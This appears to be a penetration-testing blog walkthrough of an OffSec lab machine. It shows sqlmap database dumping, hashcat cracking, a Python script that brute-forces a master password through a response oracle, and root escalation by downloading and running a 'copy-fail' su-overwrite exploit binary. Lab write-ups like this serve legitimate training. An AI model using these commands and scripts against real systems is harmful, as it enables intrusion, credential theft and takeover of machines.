@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Offensive security writeups, penetration testing labs, and CTF walkthroughs focused on web, network, and privilege escalation techniques.">
+    <meta name="keywords" content="penetration testing, pentesting, OSCP, TryHackMe writeups, HackTheBox, CTF, cybersecurity, ethical hacking">
+    <meta name="author" content="xlondra">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Pentest Writeups & Security Notes">
+    <meta property="og:description" content="Offensive security lab writeups and CTF walkthroughs.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://xlondra.github.io">
+    <title>sshcontrol - Offsec - Walkthrough</title>
+    <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+    <link rel="stylesheet" href="../../../assets/css/writeup.css">
+    <link rel="stylesheet" href="../../../assets/css/global.css">
+    <link rel="stylesheet" href="../../../assets/css/index.css">
+    <link rel="stylesheet" href="../../../assets/css/code.css">
+    <link rel="stylesheet" href="../../../assets/css/explain.css">
+
+    <script src="../../../assets/js/nav.js" defer></script>
+    <script src="../../../assets/js/footer.js" defer></script>
+    <script src="../../../assets/js/zoomer.js" defer></script>
+    <script src="../../../assets/js/writeup.js" defer></script>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="terminal">
+                <span class="prompt">londra@kali $> </span>
+                <span class="typed"></span><span class="cursor">_</span>
+            </div>
+            <div class="nav hidden">
+                <a href="../../../index.html">Home</a>
+                <a href="../../../writeuplist.html">Writeups</a>
+                <a href="../../../tools.html">Tools</a>
+                <a href="../../../contact.html">Contact</a>
+                <a href="#" class="nav-exit">exit</a>
+            </div>
+            <div class="hamburger-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -960 960 960" fill="currentColor"><path d="M120-240v-80h720v80H120Zm0-200v-80h720v80H120Zm0-200v-80h720v80H120Z"/></svg></div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="writeup">
+            <div class="lab-header">
+                <h1 class="lab-title">Offsec - sshcontrol - Walkthrough</h1>
+
+                <ul class="lab-meta">
+                    <li><strong>Date:</strong> 03-May-2026</li>
+                    <li><strong>Platform:</strong> Offsec</li>
+                    <li><strong>Difficulty:</strong> Medium</li>
+                    <li><strong>Link:</strong> <a href="https://portal.offsec.com/machine/sshcontrol-214566" target="_blank" rel="noopener noreferrer">Open Lab</a></li>
+                    <li><strong>Tags:</strong>
+                        <span class="tag">SSH</span>
+                        <span class="tag">PE</span>
+                        <span class="tag">Linux</span>
+                    </li>
+                </ul>
+            </div>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Reconnaissance</h2>
+                <p>We begin with an Nmap scan:</p>
+
+                <img src="images/nmap1.png" class="lab-image zoomable">
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo nmap -p- TARGET_IP">└─$ sudo nmap -p- TARGET_IP</code></pre>
+                </div>
+
+                <p>Ports 22 and 3000 are open. Port 22 is likely SSH, but we confirm both services with a version scan:</p>
+
+                <img src="images/nmap2.png" class="lab-image zoomable">
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo nmap -p22,3000 -T4 -sV TARGET_IP">└─$ sudo nmap -p22,3000 -T4 -sV TARGET_IP</code></pre>
+                </div>
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Enumeration</h2>
+                <p>Accessing port 3000 in a browser reveals the following page:</p>
+                <img src="images/sshcontrolhome.png" class="lab-image zoomable">
+
+                <p>Account registration is not possible; the "Register" button simply reloads the page.</p>
+
+                <p>I attempted SQL injection using sqlmap. To do this, I routed traffic through Burp Suite and submitted test credentials:</p>
+                <img src="images/burpIntercepted.png" class="lab-image zoomable">
+
+                <p>I then saved the intercepted request:</p>
+                <img src="images/saveItem.png" class="lab-image zoomable">
+
+                <p>And executed:</p>
+                
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo sqlmap -r request">└─$ sudo sqlmap -r request</code></pre>
+                </div>
+
+                <details class="command-explanation">
+                    <summary>What this command does</summary>
+                    <ul>
+                        <li>sqlmap: automates SQL injection detection and exploitation</li>
+                        <li>-r request: uses the saved HTTP request as input</li>
+                    </ul>
+                </details>
+
+                <p>This confirmed that PostgreSQL is in use:</p>
+                <img src="images/injectable.png" class="lab-image zoomable">
+            </section>
+
+            <section class="writeup-section">
+                <h2 class="section-title">Exploitation</h2>
+
+                <p>Using sqlmap, I dumped the database via time-based SQL injection:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="sudo sqlmap -r request --dbms=pgsql --dump">└─$ sudo sqlmap -r request --dbms=pgsql --dump</code></pre>
+                </div>
+
+                <p>This took some time but eventually revealed user credentials, including password hashes:</p>
+                <img src="images/hashandusername.png" class="lab-image zoomable">
+
+                <p>I identified the hash type (likely SHA-256) and attempted to crack it using hashcat. The first hash did not yield results, but a second set of credentials appeared:</p>
+                <img src="images/anotheruserandpass.png" class="lab-image zoomable">
+
+                <p>This time, the hash was successfully cracked:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="hashcat -m 1400 -a 0 hash.txt rockyou.txt">└─$ hashcat -m 1400 -a 0 hash.txt rockyou.txt</code></pre>
+                </div>
+                <img src="images/cracked.png" class="lab-image zoomable">
+                
+                <p>Using these credentials, I logged into the application:</p>
+                <img src="images/loggedin.png" class="lab-image zoomable">
+                
+                <p>The application allows adding an SSH public key, but requires a master password. According to the lab description, this password must be recovered via timing and response-pattern analysis.</p>
+
+                <p>While experimenting, I discovered that the application leaks information through its responses. Instead of relying purely on timing, I used this behavior to build a password enumerator:</p>
+
+                <details class="code-block">
+                <summary>Password enumerator (Python)</summary>
+                <pre><code>import requests
+import string
+
+URL = "http://192.168.248.89:3000/check-master-password"
+
+COOKIES = {
+    "connect.sid": "s%3AWP1smRkRoNMz1yOP6w3xnYXW4X8QFvvL.0crO9CU%2F4ruT39RPSSoBpkq0o22Is%2F2b7%2BEV0NMTU0A"
+}
+
+HEADERS = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0"
+}
+
+CHARSET = string.ascii_letters + string.digits
+
+
+def send(password):
+    r = requests.post(URL, headers=HEADERS, cookies=COOKIES,
+                      data={"masterPassword": password})
+    return r.text
+
+
+def is_prefix_valid(response):
+    return "Valid master password sequence" in response
+
+
+def main():
+    password = ""
+
+    while True:
+        found = False
+
+        for c in CHARSET:
+            guess = password + c
+            response = send(guess)
+
+            if is_prefix_valid(response):
+                print(f"[+] Correct prefix: {guess}")
+                password += c
+                found = True
+                break
+
+        if not found:
+            print("[++] Found password: " + password)
+            break
+
+
+if __name__ == "__main__":
+    main()
+</code></pre></details>
+
+                <p>This script successfully recovered the master password:</p>
+                <img src="images/foundPassword.png" class="lab-image zoomable">
+
+                <p>Next, I generated an SSH key pair:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="ssh-keygen -t ed25519">└─$ ssh-keygen -t ed25519</code></pre>
+                </div>
+
+                <p>The public key is stored in <b>~/.ssh/id_ed25519.pub</b>:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="cat /home/$USER/.ssh/id_ed25519.pub">└─$ cat /home/$USER/.ssh/id_ed25519.pub</code></pre>
+                </div> 
+
+                <p>I copied and submitted the public key:</p>
+                <img src="images/enterPublicKey.png" class="lab-image zoomable">
+
+                <p>The key was accepted:</p>
+                <img src="images/Success.png" class="lab-image zoomable">
+
+                <p>I then logged in via SSH:</p>
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="ssh username@192.168.248.89">└─$ ssh username@192.168.248.89</code></pre>
+                </div>
+
+                <p>This provided access to the system and the first flag:</p>
+                <img src="images/firstFlag.png" class="lab-image zoomable">
+            </section>
+
+            <section>
+                <h2 class="section-title">Privilege Escalation</h2>
+
+                <p>I used the recently disclosed copy-fail vulnerability affecting the <b>su</b> binary. By overwriting it with a crafted payload, privilege escalation to root is possible.</p>
+
+                <p>I downloaded the exploit binary:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="wget https://github.com/badsectorlabs/copyfail-go/releases/download/1.2.0/copyfail-go_Linux_x86_64">└─$ wget https://github.com/badsectorlabs/copyfail-go/releases/download/1.2.0/copyfail-go_Linux_x86_64</code></pre>
+                </div>
+
+                <p>Then transferred it to the target:</p>
+
+                <div class="command-wrapper">
+                    <pre><code data-copy-content="scp copyfail-go_Linux_x86_64 username@192.168.248.89:/tmp">└─$ scp copyfail-go_Linux_x86_64 username@192.168.248.89:/tmp</code></pre>
+                </div>
+
+                <p>After executing the exploit:</p>
+                <img src="images/rooted.png" class="lab-image zoomable">
+
+                <p>I obtained root access and retrieved the final flag:</p>
+                <img src="images/rootflag.png" class="lab-image zoomable">
+            </section>
+
+            <p>Thank you for reading, I hope you learned something new!</p>
+        </article>
+    </main>
+    
+    <footer>
+        Copyleft &copy; <span id="year"></span>
+    </footer>
+</body>
+</html>
